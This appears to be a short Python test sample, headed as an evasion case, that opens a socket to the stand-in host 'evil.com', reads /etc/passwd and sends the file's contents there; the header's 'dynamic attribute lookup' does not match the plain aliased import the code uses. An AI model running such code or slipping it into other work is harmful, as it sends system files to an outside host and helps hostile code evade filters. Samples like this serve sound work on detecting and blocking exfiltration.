# Evasion: socket access via dynamic attribute lookup
import socket as s
conn = s.socket(s.AF_INET, s.SOCK_STREAM)
addr = ('evil.com', 443)
conn.connect(addr)
with open('/etc/passwd') as f:
    conn.sendall(f.read().encode())
